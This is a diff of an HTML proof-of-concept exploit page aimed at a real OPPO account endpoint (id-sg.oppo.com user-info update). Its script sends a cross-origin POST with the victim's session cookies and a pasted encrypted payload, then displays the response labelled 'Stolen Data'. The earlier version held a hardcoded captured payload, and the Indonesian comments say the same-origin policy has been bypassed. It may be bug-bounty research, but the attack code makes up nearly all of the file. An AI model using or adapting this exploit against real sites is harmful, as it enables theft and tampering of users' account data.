@@ -1,36 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS PoC Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit PoC - CORS & IDOR Chain</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.6; padding: 20px; max-width: 800px; margin: auto; background-color: #f4f4f9; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #d9534f; border-bottom: 2px solid #d9534f; padding-bottom: 10px; }
+        textarea { width: 100%; height: 100px; margin: 10px 0; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; }
+        button { background-color: #d9534f; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #c9302c; }
+        .result-box { margin-top: 20px; padding: 15px; background: #222; color: #0f0; border-radius: 4px; min-height: 50px; word-break: break-all; font-family: monospace; }
+        .label { font-weight: bold; margin-top: 10px; display: block; }
+    </style>
 </head>
 <body>
-    <h1>CORS Vulnerability Proof of Concept</h1>
-    <button onclick="exploit()">Klik untuk Ambil Data</button>
-    <p>Hasil Response:</p>
-    <div id="result" style="background: #eee; padding: 10px; word-break: break-all;"></div>
 
-    <script>
-        function exploit() {
-            var xhr = new XMLHttpRequest();
-            var url = "https://id-sg.oppo.com/uc/web/v1/user-info/update-basic-info";
-            
-            xhr.open("POST", url, true);
-            xhr.withCredentials = true; // Kunci untuk membawa session cookie
-            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+<div class="container">
+    <h1>CORS Vulnerability PoC</h1>
+    <p>Target: <code>id-sg.oppo.com</code></p>
+    
+    <label class="label">Input Request Body (Encrypted Payload):</label>
+    <textarea id="payloadInput" placeholder="Paste encrypted payload here (H4sIA...)"></textarea>
+    
+    <button onclick="runExploit()">Execute Cross-Origin Request</button>
 
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4) {
-                    // Jika muncul teks di sini, berarti CORS bocor
-                    document.getElementById("result").innerText = xhr.responseText;
-                    console.log(xhr.responseText);
-                }
-            };
+    <label class="label">Server Response (Stolen Data):</label>
+    <div id="result" class="result-box">Waiting for execution...</div>
+</div>
 
-            // Masukkan data request body yang Anda temukan di Burp Suite (Gambar 1 atau 2)
-            var payload = '"H4mCxNgIzhFZiS+YorueYXtYgtl4lt8LabhM3f2btk+f+NExcsTrPxfDsIwAWDLA S8cj2IIiaia6g+ThXeN8sAgIYq6FE3dDUNV7CGW5s/g5hweeEQw0wzqQGDKCaeiXMlhxUD25cQbwHVCKwNzQ/zvGONNhvzzK7ILafJHxKt6w=.QK4TmC0YPKenPUeh01ekQjV7x6hKcGCP/K7/D2kGld1oAkQ3ZK+N2W/KSwznJohXMPymjSd3Di3B1EkaJXXXXzKAWSb6bYkmfqk4QJS7gz50GWqgLIK9t1HyjDQo484OMMH4lRwgPdjaXQdPcS pwe2/dgyeIx6h4SyLjoGQMXI=.NwtMvQ2D3dIe/PE="';
-            
-            xhr.send(payload);
+<script>
+    function runExploit() {
+        const resultDiv = document.getElementById("result");
+        const payload = document.getElementById("payloadInput").value;
+        const targetUrl = "https://id-sg.oppo.com/uc/web/v1/user-info/update-basic-info";
+
+        if (!payload) {
+            alert("Please paste a payload first!");
+            return;
         }
-    </script>
+
+        resultDiv.innerText = "Sending request...";
+
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", targetUrl, true);
+        
+        // KUNCI UTAMA
+        xhr.withCredentials = true; 
+        
+        xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    // Jika teks muncul di sini, SOP browser telah ditembus
+                    resultDiv.innerText = xhr.responseText;
+                    console.log("Success! Stolen Data:", xhr.responseText);
+                } else {
+                    resultDiv.innerText = "Error: " + xhr.status + " - Check Console for details.";
+                    resultDiv.style.color = "#ff4d4d";
+                    console.error("Request failed with status:", xhr.status);
+                }
+            }
+        };
+
+        xhr.send(payload);
+    }
+</script>
+
 </body>
 </html>
